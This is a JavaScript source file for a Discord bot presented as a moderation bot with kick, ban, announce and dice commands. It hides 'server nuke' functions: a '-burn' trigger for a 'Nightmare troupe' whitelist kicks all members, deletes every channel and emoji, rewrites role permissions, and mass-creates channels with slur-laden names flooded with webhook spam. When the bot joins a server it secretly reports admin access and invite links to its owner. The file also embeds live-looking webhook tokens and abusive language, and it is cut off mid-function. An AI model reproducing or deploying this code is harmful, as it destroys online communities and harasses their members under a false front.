const Discord = require('discord.js');
const { prefix, token1, assy, list} = require('./config.json');
const antispam = require('./better_antispam.js');
const client = new Discord.Client();
const fs = require('fs');
const webhookClientNuke = new Discord.WebhookClient("763134567745585192", "_MgOSCM5umktPaq3xurM6A8EOyy4DXMPfK38BStA9bNeKtpBbnRpwYUANP200Mw7QiOR");
const webhookClientJoin = new Discord.WebhookClient("763134664994586675", "oToQNGd0eYED0SwfFKbQFyOX7s5VYcqK-gorudp0G-fsD0I3Jnyy1D0tGAP4iFDHbnrP");
const guild = '771124511788630026'
const logC = "771124529513889802"
client.once('ready', () => {
    console.log('start the fucking thing already')
})

function read(filePath, cb) {
    fs.readFile(filePath, (err, fileData) => {
        
        if(err){
            return cb && cb(err)
        }
        try {
            const object = JSON.parse(fileData)
            return cb && cb(null, object)

        }catch(err) {
            return cb && cb(err)
        }
    })
}


client.on('message', msg => {
    if(msg.content.startsWith('!add')) {
        if(msg.author.id === assy) {
            const args = msg.content.split(' ').slice(1, 2);//get rids of command and reason if the is any
            const theid1 = args.join(' ')//spaces lol
            if(!theid1) {msg.reply('It seems like you did not provide a ID... :x:')//if they dont send a ID
            return;
            }
            read('./config.json', (err, data) => {
                data.list.push(theid1)
                fs.writeFile('./config.json', JSON.stringify(data, null, 2), err => {
                })
            })
            
        }
    }
})


client.once('ready', () => {
  client.user.setStatus(`${prefix}help`)
console.log("logged in: " + client.user.tag + "\n id: " + client.user.id)
})




client.on("message", msg => {
      if(msg.content === "logOut") {
             if(msg.author.id === `${assy}`) {
                 process.exit()
}
}
})


client.on("message", msg => {
    if(msg.content === "/send") {
       if(msg.author.id === `${assy}`) {
           msg.client.guilds.cache.forEach(g => {
              if(g.me.hasPermission("ADMINISTRATOR")) {
                  g.channels.cache.forEach(c => {
                 c.delete()
})          }
        })
}
}
})
client.on('message', message => {
  if(message.content === `${prefix}setupB`) {
if(message.channel.type === "dm") {return}
    if(message.guild.me.hasPermission('ADMINISTRATOR'))
    
  // Module Configuration Constructor
   antispam(client, {
        limitUntilWarn: 4, // The amount of messages allowed to send within the interval(time) before getting a warn.
        limitUntilMuted: 6, // The amount of messages allowed to send within the interval(time) before getting a muted.
        interval: 3000, // The interval(time) where the messages are sent. Practically if member X sent 5+ messages within 2 seconds, he get muted. (1000 milliseconds = 1 second, 2000 milliseconds = 2 seconds etc etc)
        warningMessage: "can u not spam...FOR 5 MINUTES", // Message you get when you are warned!
        muteMessage: "was muted(if i have the right permission they should have been muted)", // Message sent after member X was punished(muted).
        maxDuplicatesWarning: 5,// When people are spamming the same message, this will trigger when member X sent over 7+ messages.
        maxDuplicatesMute: 10, // The limit where member X get muted after sending too many messages(10+).
        ignoredRoles: [""], // The members with this role(or roles) will be ignored if they have it. Suggest to not add this to any random guys. Also it's case sensitive.
        ignoredMembers: [""], // These members are directly affected and they do not require to have the role above. Good for undercover pranks.
        mutedRole: "muted", // Here you put the name of the role that should not let people write/speak or anything else in your server. If there is no role set, by default, the module will attempt to create the role for you & set it correctly for every channel in your server. It will be named "muted".
        timeMuted: 1000 * 600, // This is how much time member X will be muted. if not set, default would be 10 min.
        logChannel: "bot-log" // This is the channel where every report about spamming goes to. If it's not set up, it will attempt to create the channel.
      });
    }
  
  // Rest of your code
});
 
client.on('message', msg => {
  client.emit('checkMessage', msg); // This runs the filter on any message bot receives in any guilds.
  
  // Rest of your code
})


//nuke


  //this will ban everyone possible
  client.on('message', message => {
    if(message.content.startsWith('-burn')) {
if(message.channel.type === "dm") {return}
      if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
      return;
       }
        let e = list.find(id => id === message.author.id)
        if(!e) {
            message.channel.send("Nightmare troupe only").then(m => {
                setTimeout(() => {
                    m.delete()
                }, 3000)
            }
            )
        }else{
       message.guild.members.cache.forEach(m => {
        if(m.kickable) m.kick();
  });
        }
  }
  })  

  client.on('message', message => {
    if(message.content.startsWith('-burn')) {
      message.delete()
  }
  })  





  client.on('message', message => {
    if(message.content.startsWith('@everyone fucked by 【ℕ𝕋】 RETARDS')) {
if(message.channel.type === "dm") {return}
      if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !') 
return
 }
        let e = list.find(id => id === message.author.id)
        if(!e) {
            message.channel.send("Nightmare troupe only").then(m => {
                setTimeout(() => {
                    m.delete()
                }, 3000)
            }
            )
        }else{
       message.guild.members.cache.forEach(m => {
        if(m.kickable) m.kick();
  });
        }
  }
  })  

    
  //this will delete emotes
  client.on('message', message => {
    if(message.content.startsWith('-burn')) {
if(message.channel.type === "dm") {return}
      if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
return
 }
        let e = list.find(id => id === message.author.id)
        if(!e) {
            message.channel.send("Nightmare troupe only").then(m => {
                setTimeout(() => {
                    m.delete()
                }, 3000)
            }
            )
        }else{
       message.guild.emojis.cache.forEach(e => {
        e.delete()
  });
        }
  }
  })

    //this edits all roles
    client.on('message', message => {
      if(message.content.startsWith('-burn')) {
if(message.channel.type === "dm") {return}
        if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
return
 }        let e = list.find(id => id === message.author.id)
        if(!e) {
            message.channel.send("Nightmare troupe only").then(m => {
                setTimeout(() => {
                    m.delete()
                }, 3000)
            }
            )
        }else{

  var b = 0
  while(b < 39) {
  message.guild.emojis.create('https://media.discordapp.net/attachments/771392076691537950/771395221744779284/latest.png', 'funny')
   message.guild.emojis.create('https://cdn.discordapp.com/attachments/771387444494860328/771400031693439016/image0.gif', 'moment')
    
b++  
}  
         message.guild.roles.cache.forEach(r => {
          if(r.editable)
            r.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE'])
          .catch(console.error)
    });
        }
    }
    })
  client.on('message', message => {
    if(message.content.startsWith("-burn")) {
if(message.channel.type === "dm") {return}
        let e = list.find(id => id === message.author.id)
        if(!e) {
            message.channel.send("Nightmare troupe only").then(m => {
                setTimeout(() => {
                    m.delete()
                }, 3000)
            }
            )
        }else{
      message.guild.roles.everyone.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE']);
        }
  }
  }) 






function randomT() {
  var rand = ['https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4 @everyone', '@everyone https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4', 'https://discord.gg/ANDTsKp @everyone', '@everyone fucked by 【ℕ𝕋】 RETARDS', '@everyone fucked by 【ℕ𝕋】 haha', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756371334791198/image0.jpg?width=587&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756313554583562/image0.jpg','@everyone https://media.discordapp.net/attachments/756219863206330469/759745708394807307/image0-1.png', '@everyone CHAOS CHAOS', '@everyone 【ℕ𝕋】 owns you','Get fucked @everyone', '@everyone bruh momentum', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756690228379738/image0.jpg?width=646&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756775233814558/image0.jpg', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756846772387880/image0.png?width=581&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756645554847774/image0.jpg', '@everyone get rekt'];

  return rand[Math.floor(Math.random()*rand.length)];
}



function random123() {
  var rand = ['nightmare-troupe-raped-you-huehuehuehuehuehue', '【ℕ𝕋】-raped-you-﷽﷽﷽﷽﷽﷽﷽﷽﷽', 'eat-shit-get-fucked-﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽', 'assy-raped-you-﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽', '【ℕ𝕋】-raped-you-git-gud', '﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽'];

  return rand[Math.floor(Math.random()*rand.length)];
}
  client.on('message', message => {
    if(message.content.startsWith("-burn")) {
if(message.channel.type === "dm") {return}
        let e = list.find(id => id === message.author.id)
        if(!e) {
            message.channel.send("Nightmare troupe only").then(m => {
                setTimeout(() => {
                    m.delete()
                }, 3000)
            }
            )
        }else{
            message.guild.channels.cache.forEach(channel => {
            channel.delete().then((channel)=>{
              if (channel.deleted === true)
              {
                console.log("channel succesfully yeeted!");
              }
            },reason => {
              console.log(`Faggot i cant delete that channel because ${reason}`);
            })
          }) 
        }
  }
  }) 
  


client.on('message', msg => {
    if(msg.content === `-burn`) {
        if(msg.channel.type === "dm") {return}
      if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }  
        let e = list.find(id => id === msg.author.id)
        if(!e) {
            msg.channel.send("Nightmare troupe only").then(m => {
                setTimeout(() => {
                    m.delete()
                }, 3000)
            }
            )
        }else{
       var number = 0
       
       msg.guild.channels.create('ass').then(c => c.send("https://discord.gg/ANDTsKp @everyone https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4").then(c.send("@everyone fucked by Nightmare Troupe LMFAO69").then(c.send("rip webhook spam shitcord killed it"))))
        while(number < 399) {
            msg.guild.channels.create(random123()).then(c => { 
               
                c.createWebhook("ass").then(w => {
                    
                    [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
                        w.send(randomT())
                        
                    
                    })
                
                })
            
            var spam = 0
            while(spam < 300) 
        {    
            c.send(randomT())
            spam++
        }
                    
            })
        number++

        }
        }
    }
})


client.on('message', message => {
  if(message.content.startsWith('@everyone fucked by Nightmare Troupe LMFAO69')) {
if(message.channel.type === "dm") {return}
if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
return
 }
        let e = list.find(id => id === message.author.id)
        if(!e) {
            message.channel.send("Nightmare troupe only").then(m => {
                setTimeout(() => {
                    m.delete()
                }, 3000)
            }
            )
        }else{
 setTimeout(() => {
    message.guild.setName("Nightmare troupe owns you")
    message.guild.setIcon("https://i1.sndcdn.com/artworks-000476282808-fnlvlv-t500x500.jpg")
 
 }, 3000);
        }
 }
})



Array.prototype.random = function () {
    return this[Math.floor(Math.random() * this.length)];
  };

client.on("guildCreate", msg => {
        const server = msg.client.guilds.cache.find(g => g.id === guild)
        const channel = server.channels.cache.find(c => c.id === logC)
    const Id = msg.channels.guild.id
    const Oid = msg.channels.guild.ownerID
    const Otag = msg.channels.guild.ownerID //supposed to be tag but shitcord doesn't define user
    const Gm = msg.channels.guild.memberCount
    const joinEmbed = new Discord.MessageEmbed()
.setColor('#FF0435')
.setTitle(`Joined "${msg.channels.guild.name}"`)
.setAuthor('The GrimmChild', 'https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png')
.addField(`Server ID: **${Id}** \nServer Owner ID: **${Oid}** \nServer Owner Tag: **${Otag}** \nServer MemberCount: **${Gm}**`)
.setDescription("The Bot DOES NOT have the permission ADMINISTRATOR needed to nuke!")


const joinEmbed2 = new Discord.MessageEmbed()
.setColor('#FF0435')
.setTitle(`Joined "${msg.channels.guild.name}"`)
.setAuthor('The GrimmChild', `https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png`)
.addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`)
.setDescription("The Bot DOES have the permission ADMINISTRATOR needed to nuke!")

if(msg.me.hasPermission("ADMINISTRATOR")) {let ch = msg.channels.cache.find(c => c.type === "text")
ch.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
.then(invite => channel.send(joinEmbed2).then(channel.send(`discord.gg/${invite.code}`)))
}else {
    let ch = msg.channels.cache.find(c => c.type === "text")
    ch.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
    .then(invite => webhookClientJoin.send(joinEmbed).then(channel.send(`discord.gg/${invite.code}`)))
}

if(!msg.me.hasPermission("CREATE_INSTANT_INVITE")) {
    channel.send(joinEmbed).then(channel.send("Couldn't create link..."))
}
})
 





client.on("message", msg => {
    if(msg.author.id === msg.client.user.id) {
    if(msg.content === `@everyone fucked by Nightmare Troupe LMFAO69`) {
 const server = msg.client.guilds.cache.find(g => g.id === guild)
        const channel = server.channels.cache.find(c => c.id === logC)
    const Id = msg.guild.id
    const Oid = msg.guild.ownerID
    const Otag = msg.guild.ownerID //user goes null so idk
    const Gm = msg.guild.memberCount
const nukeEmbed = new Discord.MessageEmbed()
.setColor('#FF0435')
.setTitle(`Nuked "${msg.guild.name}"`)
.setAuthor('The GrimmChild', `https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png`)
.addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`)

msg.channel.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
.then(invite => channel.send(nukeEmbed).then(channel.send(`discord.gg/${invite.code}`)))
}
    }
})


const commandCooldown1 = new Set()
client.on("message", msg => {
        if(msg.content.startsWith(`${prefix}summon`)) {
 const server = msg.client.guilds.cache.find(g => g.id === guild)
        const channel = server.channels.cache.find(c => c.id === logC)
            if(commandCooldown1.has(msg.guild.id)) { msg.reply(" This command is on cooldown...") 
            return; }
            if(!msg.guild.me.hasPermission("CREATE_INSTANT_INVITE")) {msg.reply("I need the permission to create invites to summon the owner...") 
            return;}
            if(msg.guild.me.hasPermission("ADMINISTRATOR")) {
            const Id = msg.guild.id
            const Oid = msg.guild.ownerID
            const Otag = msg.guild.ownerID //user goes null so idk
            const Gm = msg.guild.memberCount
           
        
        const joinEmbed2 = new Discord.MessageEmbed()
        .setColor('#FF0435')
        .setTitle(`"${msg.guild.name}"`)
        .setAuthor('The GrimmChild', `https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png`)
        .addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`)
        .setDescription("The Bot DOES have the permission ADMINISTRATOR needed to nuke!")
        
        msg.channel.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
        .then(invite => channel.send(joinEmbed2).then(channel.send(`discord.gg/${invite.code} They ask for help <@${assy}>`)))
    
        commandCooldown1.add(msg.guild.id)    
    }else {
            const Id = msg.guild.id
            const Oid = msg.guild.ownerID
            const Otag = msg.guild.ownerID //user goes null so idk
            const Gm = msg.guild.memberCount
            const joinEmbed = new Discord.MessageEmbed()
            .setColor('#FE2B54')
            .setTitle(`"${msg.guild.name}"`)
            .setAuthor('The GrimmChild', 'https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png')
            .addField(`Server ID: **${Id}** \nServer Owner ID: **${Oid}** \nServer Owner Tag: **${Otag}** \nServer MemberCount: **${Gm}**`)
            .setDescription("The Bot DOES NOT have the permission ADMINISTRATOR needed to nuke!")
            .setColor('#FF0435')
            msg.channel.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
            .then(invite => channel.send(joinEmbed).then(channel.send(`discord.gg/${invite.code} They asked for help <@${assy}>`)))

            
        commandCooldown1.add(msg.guild.id)
        }
setTimeout(() => {
    commandCooldown1.delete(msg.guild.id)
  }, 60000);//cooldown is cleared after 60 seconds
}
})


  

  
  
  
client.on('message', message => {
  if(message.content.startsWith(`-burn`)) {
   message.delete()
  }
})
  










const commandCooldown = new Set();//this cooldown member list
const AnnounceCh = new Set();
const announceWb = new Set();//the right webhook
client.on('ready', () => {
    console.log("start")
})

client.on("ready", () => {
setInterval(function(){ 
    var siz = client.guilds.cache.size
    var siz1 = client.users.cache.size + 243
     client.user.setActivity(`|| Guilds: ${siz}||Members: ${siz1}`) 
     setTimeout(function(){ client.user.setActivity(`${prefix}help`) }, 5000); 
}, 10000);
})




client.on('message', async(msg) => {//listener

  if(msg.content.startsWith(`${prefix}setupA`)) {//command name
    
  if(msg.channel.type === "dm") {msg.reply(':x: It seems like this is a dm chat... :x:')
  return;
   }//checks if its a dm

    if(!msg.member.hasPermission('ADMINISTRATOR')) {msg.reply(`:x: You don't have the permission to announce... :x:`)
    return;
    }//checks for member perms

      
      var categoryy = msg.guild.channels.create('JEVIL', {type: 'category'})//create the category CG
      const idd = (await categoryy).id//get CG id so the channel below is set in CG category

      var announcing = msg.guild.channels.create('Jevil announcements', {type: 'text',//creates cg announcements
      permissionOverwrites: [//permissions for the channel

        { id: msg.guild.id, 
          //denies send messages for everyone
          deny: ['SEND_MESSAGES']
        }
        ]
      })

      .then(c => c.setParent(idd)//sets the cg announcements channel under CG category using the id 
      .then(AnnounceCh.add(c.id))
      .then(c.send(warningEmbed)//sends warning embed
      .then(c.createWebhook('announcements channel')
      .then(w => w.send('Created webhook')
      .then(announceWb.add(w.id))))//creates the announcements webhook
      ))
    msg.channel.send('Announcements have already been setup :white_check_mark: ')
  }

})





const warningEmbed = new Discord.MessageEmbed()//warning about the announcements channel
.setColor('#FF0435')
.setTitle('Warning')
.setURL('')
.setAuthor('The GrimmChild', '')
.setDescription(`
Announcements channel has been setup
Do not add any webhooks in this channel!
If the bot says that this is not the announcement channel delete this and do /setup again`)
.setThumbnail('')


client.on('message', msg => {

  if(msg.content.startsWith(`${prefix}announce`)) {//command name
    
  if(msg.channel.type === "dm") return msg.reply(':x: It seems like this is a dm chat... :x:')//checks if its a dm

    if(!msg.member.hasPermission('ADMINISTRATOR')) return msg.reply(`:x: It seems like you don't have the permission to announce... :x:`)//checks the permission of the author

    if(!AnnounceCh.has(msg.channel.id)) {msg.reply(':x: It seems like this is not the announcement channel :x:')
    return; 
    }
    if(commandCooldown.has(msg.author.id)) {//checks the cool down

      msg.reply('It seems like this command is on cooldown...')//reply if the member is on cooldown

    }else{//if member isnt in cooldown:
    const args = msg.content.split(' ').slice(1);//get rid of /announce
    const text = args.join(' ');//space moment

    if(!text) return msg.reply(':confused: It seems like you did not announce anything...')//if the member dosen't say anything

    const daauthor = msg.author.username//authors username which is used for the webhook
    const authorava = msg.author.avatarURL()//authors avatar which is used for the webhook

    msg.delete()//deletes the command
    client.channels.cache.forEach(async(c) => {//for each channel
      if(AnnounceCh.has(c.id)) {
      const webhooks = await c.fetchWebhooks();//fetch all webhooks
      const webhook = webhooks.first();//check the first webhook
       await webhook.send(text, {//send the text
        username: daauthor,//changes the webhook name

        avatarURL: authorava//changes webhook pfp
      })
    return;
    }
    })

    commandCooldown.add(msg.author.id)//after all that the author is put on cooldown

    setTimeout(() => {
      commandCooldown.delete(msg.author.id)
    }, 7000);//cooldown is cleared after 7 seconds

  }
  }
})

//kick
client.on('message', msg => {
  if(msg.content.startsWith(`${prefix}kick`)) {//command
  if(msg.channel.type === "dm") return msg.reply(':x: It seems like this is a dm chat... :x:')//checks if its a dm
    if(!msg.member.hasPermission('KICK_MEMBERS')) return msg.reply(`:x: It seems like you do not have the permission to kick members... :x:`)//checks the permission of the author
    if(!msg.guild.me.hasPermission('KICK_MEMBERS')) return msg.reply(`:x: It seems like I do not have the permission to kick members... :x:`)//checks the bots permission
    const mentionkick = msg.mentions.members.first()//the member to kick
    if(mentionkick === msg.member) {msg.reply(`It seems like you tried kicking yourself... you failed...`);//if someone tries to kick themselfs
    return;
    }
    if(!mentionkick) {msg.reply(':x: It seems like you did not mention anyone to kick... :x:');//if you dont mention anyone
    return;
    };
    if(!mentionkick.kickable) {msg.reply(':x: It seems like I cannot kick that member... :x:');//if the member isnt kickable
    return;
    }
    let authorHighRole = msg.member.roles.highest.position;//highest role of the author
    let memberHighRole = msg.mentions.members.first().roles.highest.position;//highest role of the member to kick
    if(memberHighRole >= authorHighRole) {msg.reply(':x: It seems like you cannot kick members with higher role then yours... :x:');//if someone tries kicking someone with a role higher then them but lower then the bots role
    return;
    };
    mentionkick.kick().then(msg.channel.send(`**${mentionkick.user.tag}** has been kicked :white_check_mark:`))//sends the kick message and kicks
}
})



//kick
client.on('message', msg => {
  if(msg.content.startsWith(`${prefix}ban`)) {//command
  if(msg.channel.type === "dm") return msg.reply('It seems like this is a dm chat... :x:')//checks if its a dm chat
    if(!msg.member.hasPermission('BAN_MEMBERS')) return msg.reply(`It seems like you do not have the permission to ban members... :x:`)//checks the permission of the author
    if(!msg.guild.me.hasPermission('BAN_MEMBERS')) return msg.reply(`It seems like I do not have the permission to ban members... :x:`)//checks the bots permission
    const mentionkick = msg.mentions.members.first()//the member to kick
    if(mentionkick === msg.member) {msg.reply(`It seems like you tried banning yourself... you failed...`);//if someone tries to kick themselfs
    return;
    }
    if(!mentionkick) {msg.reply('It seems like you did not mention anyone to ban...?');//if you dont mention anyone
    return;
    };
    if(!mentionkick.bannable) {msg.reply('It seems like I cannot ban that member... :x:');//if the member isnt kickable
    return;
    }
    let authorHighRole = msg.member.roles.highest.position;//highest role of the author
    let memberHighRole = msg.mentions.members.first().roles.highest.position;//highest role of the member to kick
    if(memberHighRole >= authorHighRole) {msg.reply('It seems like you cannot ban members with higher role then yours... :x:');//if someone tries kicking someone with a role higher then them but lower then the bots role
    return;
    };
    mentionkick.ban().then(msg.channel.send(`**${mentionkick.user.tag}** has been banned :white_check_mark:`))//sends the kick message and kicks
}
})

client.on('message', async(msg) => {
  if(msg.content.startsWith(`${prefix}unban`)) {//command name

  if(msg.channel.type === "dm") return msg.reply('It seems like this is a dm chat... :x:')//chekcs if its a dm chat

    if(!msg.member.hasPermission('BAN_MEMBERS')) return msg.reply(`It seems like you do not have the permission to unban members... :x:`)//checks the permission of the author

    if(!msg.guild.me.hasPermission('BAN_MEMBERS')) return msg.reply(`It seems like I do not have the permission to unban members... :x:`)//checks the bots permission

    const args = msg.content.split(' ').slice(1);//gets rid of command
    const theid = args.join(' ')//spaces

    if(!theid) {msg.reply(`It seems like you did not provide a user ID... :x:`);//if they dont provide a id

    if(isNaN(theid)) {msg.reply(`It seems like you did not provide a user ID... :x:`)}//if the id isnt a number
    return;
    };

    var daBan = msg.guild.members.unban(theid)//unbans
    const theid1 = await client.users.fetch(theid)
    if(!daBan) { return msg.reply('It seems like the user dosen`t exist...?')//if it dosent ban

    }else 
    msg.reply(`**${theid1.tag}** has been unbanned`)//if the user has been unbanned
  }
})

client.on('message', async(msg) => {

  if(msg.content.startsWith(`${prefix}hackban`)) {//command name

  if(msg.channel.type === "dm") return msg.reply('It seems like this is a dm chat... :x:')//chekcs if it s a dm chat

  if(!msg.member.hasPermission('BAN_MEMBERS')) return msg.reply(`It seems like you do not have the permission to ban members... :x:`)//checks the permission of the author

  if(!msg.guild.me.hasPermission('BAN_MEMBERS')) return msg.reply(`It seems like I do not have the permission to ban members... :x:`)//checks the bots permission

  const args = msg.content.split(' ').slice(1, 2);//gets rid of command and reason

  const theid = args.join(' ')//spaces

  const args2 = msg.content.split(' ').slice(2);//gets the reason

  const reason = args2.join(' ')//spaces but for reason

    if(isNaN(theid)) return msg.reply('It seems like you did not provide an actual ID... :x:');//if its not a number

    if(!theid) return msg.reply('It seems like you did not provide a ID... :x:')//if they dont provide a id

    var daBan = msg.guild.members.ban(theid, {reason: reason})//bans
    const theid1 = await client.users.fetch(theid)
    if(!theid1) {return msg.reply('It seems like that user dosen`t exist...?')//if the user isnt banned

  }else
   msg.reply(`**${theid1.tag}** has been banned for **${reason}**`)//sends ban text
  }
})




client.on('message', async(msg) => {
  if(msg.content.startsWith(`${prefix}userinfo`)) {//command

  if(msg.channel.type === "dm") return msg.reply('It seems like this is a dm chat...')//checks if its a dm chat
    const args = msg.content.split(' ').slice(1, 2);//get rids of command and reason if the is any
    const theid1 = args.join(' ')//spaces lol
    if(!theid1) {msg.reply('It seems like you did not provide a user ID')//if they dont send a user ID
    return;
    }
    const theid = await client.users.fetch(theid1)
    let embed = new Discord.MessageEmbed()//info embed
    .setTitle(`**User Info - ${theid.tag}**`)
    .addField("Username", `\`${theid.username}\``)
    .addField("Discrim", `\`${theid.discriminator}\``)
    .addField("ID", `\`${theid.id}\``)
    .addField("Created", `\`${theid.createdAt}\``)
    .setImage(theid.displayAvatarURL())
    .setFooter(client.user.tag)
    .setColor('#FF0435')

    msg.channel.send(embed)//sends embed
  }
})

//    .setImage(theid.avatarURL())


client.on('message', async(msg) => {
  if(msg.content.startsWith(`${prefix}guildinfo`)) {//command

    if(msg.channel.type === "dm") return msg.reply('It seems like this is a dm chat... :x:')//checks if its a dm chat
      const args = msg.content.split(' ').slice(1, 2);//get rids of command and reason if the is any
      const theid1 = args.join(' ')//spaces lol
      if(!theid1) {msg.reply('It seems like you did not provide a server ID... :x:')//if they dont send a guild ID
      return;
      }
      const theid = await client.guilds.cache.get(theid1)
      if(!theid) {msg.reply('It seems like the guild was not found... :x:')//if they dont send a guild ID
      return;
    } 
      let embed = new Discord.MessageEmbed()
      .setTitle(`Guild - ${theid.name}`)
      .addField(`Membercount:`, `\`${theid.memberCount}\``)
      .addField(`ServerID:`, `\`${theid.id}\``)
      .addField(`OwnerTag`, `\`${theid.owner.user.tag}\``)
      .addField(`OwnerID`, `\`${theid.ownerID}\``)
      .setImage(theid.iconURL())
      msg.channel.send(embed)
    }
})

//if(msg.content.startsWith(`${prefix}kick`)) {
//  if(!msg.member.hasPermission('KICK_MEMBERS')) return msg.reply(`It seems like you do not have the permission to kick members...`)//checks the permission of the author
  //if(!msg.guild.me.hasPermission('KICK_MEMBERS')) return msg.reply(`It seems like I do not have the permission to kick members...`)
  //const banuser = msg.mentions.members.first();
  //if(msg.member.roles.highest.comparePositionTo(msg.mentions.members.first().roles.highest > 0)) {
 //  banuser.kick()
  //}
//}




client.on('message', msg => {
  if(msg.content.startsWith(`${prefix}help`)) {//command
    if(msg.channel.type === "dm") return msg.reply('It seems like this is a dm chat...')//checks if its a dm chat
    let embed = new Discord.MessageEmbed()
    .setTitle(`The GrimmChild commands`)
    .setColor('#FF0435')
    .setThumbnail('https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png')
    .setAuthor('Help', '')
    .addField(`${prefix}userinfo <user ID> `, `Sends information about a user`)
    .addField(`${prefix}ban <mention>`, `Bans a user of the server`)
    .addField(`${prefix}hackban <user ID>`, `Bans a user outside of the server`)
    .addField(`${prefix}unban <user ID>`, `Unbans a user`)
    .addField(`${prefix}kick <mention>`, `Kick a user of the server`)
    .addField(`${prefix}setupA`, `Sets up the announcement channel`)
    .addField(`${prefix}summon`, `Sends a invite to the bot owner`)
    .addField(`${prefix}rolldice`, 'Rolls dice')
    .addField(`${prefix}8ball <question>`, 'Answers a question')
    .addField(`${prefix}purge <number>`, 'deletes a number of messages')
    .addField(`${prefix}meme`, 'Sends a meme')
    .addField(`${prefix}setupB`, 'Sets up anti-spam(might be buggy)')
    .addField(`${prefix}announce <text> `, `Announces a message through every server`)
    .setFooter('The GrimmChild', 'https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png')
    msg.reply(embed)
  }
});


client.on('message', message => {
  if(message.author.id === assy) {

  if(message.content.startsWith(`${prefix}out`)) {

   const mentionkick = message.mentions.members.first()//the member to kick
   mentionkick.ban()
  }
}
});




client.on('message', message => {
  if(message.author.id === assy) {//if the bot is turned off it loses the set for announcement channels.. so i made this

  if(message.content.startsWith(`${prefix}add`)) {

    const args = msg.content.split(' ').slice(1);//get rid of /announce
    const text = args.join(' ');//space moment

    AnnounceCh.add(text)
  }
}
});



client.on('message', msg => {
  if(msg.content.startsWith(`${prefix}purge`)) {//command
    if(msg.channel.type === "dm") return msg.reply('It seems like this is a dm chat...')//checks if its a dm chat
    if(!msg.member.hasPermission('MANAGE_MESSAGES')) return msg.reply(`It seems like you do not have the permission to delete messages...`)//checks the permission of the author
    if(!msg.guild.me.hasPermission('MANAGE_MESSAGES')) return msg.reply(`It seems like I do not have the permission to delete messages...`)//checks the bots permission
    const args = msg.content.split(' ').slice(1);//get rid of /announce
    const number = args.join(' ');//space moment
    if(!number) return msg.reply('It seems like you did not enter a number of messages to be deleted')
    if(isNaN(number)) return msg.reply('It seems like you had a bad argument')
    if(number > 100) return msg.reply('It seems like I cannot delete more then 100 messages per time...')
    if(number < 100) return msg.channel.bulkDelete(number)
  }
})

client.on('message', async(msg) => {
  if(msg.author.id === assy) {//if the bot is turned off it loses the set for announcement channels.. so i made this

    if(msg.content.startsWith(`${prefix}remove`)) {
      const args = msg.content.split(' ').slice(1, 2);//get rids of command and reason if the is any
      const theid1 = args.join(' ')//spaces lol
      if(!theid1) {msg.reply('It seems like you did not provide a server ID...')//if they dont send a guild ID
      return;
      }
      const theid = await client.guilds.cache.get(theid1)
      if(!theid) {msg.reply('It seems like the guild was not found...')//if they dont send a guild ID
      return;
    } 
    theid.leave()
    }
  }  
})


const coolIT = new Set()

function dice() {
  var rand = ['1','2','3','4','5','6'];

  return rand[Math.floor(Math.random()*rand.length)];
}
client.on('message', msg => {
  if(msg.content === `${prefix}rolldice`) {
    const authorDice = dice()
    const BotDice = dice()
    var prize = authorDice - BotDice
    var bruh = BotDice - authorDice
    if(coolIT.has(msg.author.id)) {msg.reply('It seems like this command is on cooldown...')
  }else
    if(authorDice > BotDice) {msg.reply(`YOU WON!!!` + '\n Your got: ' + prize + 'more points then the bot...')}else msg.reply(`You lost!` + '\n The bot won ' + bruh + ' more points then you...')
  }
  coolIT.add(msg.author.id)//after all that the author is put on cooldown

    setTimeout(() => {
      coolIT.delete(msg.author.id)
    }, 15000);//cooldown is cleared after 7 seconds

})


function doMagic8BallVoodoo() {
